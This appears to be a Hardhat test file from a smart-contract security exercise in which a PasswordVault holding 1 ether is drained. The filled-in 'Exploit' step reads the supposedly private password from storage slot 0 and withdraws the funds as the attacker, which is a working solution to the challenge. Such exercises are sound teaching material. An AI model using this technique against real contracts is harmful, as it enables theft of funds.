const { expect } = require('chai')
const { ethers } = require('hardhat')

describe('[PASSWORD VAULT EXPLOIT]', async function () {
    let deployer, attacker

    const VAULT_BALANCE = ethers.utils.parseEther('1')

    before(async function () {
        // SET UP
        ;[deployer, attacker, alice] = await ethers.getSigners()

        this.vault = await (
            await ethers.getContractFactory('PasswordVault', deployer)
        ).deploy(require('./secrets/dont-peek'))

        await deployer.sendTransaction({ to: this.vault.address, value: VAULT_BALANCE })

        expect(
            await ethers.provider.getBalance(this.vault.address)
        ).to.be.equal(VAULT_BALANCE)
    })

    it('Exploit', async function () {
        // YOUR EXPLOIT HERE
        const password = await ethers.provider.getStorageAt(this.vault.address,0);
        await this.vault.connect(attacker).withdraw(password);
    })

    after(async function () {
        // SUCCESS CONDITIONS
        expect(await ethers.provider.getBalance(this.vault.address)).to.be.equal('0')
    })
})
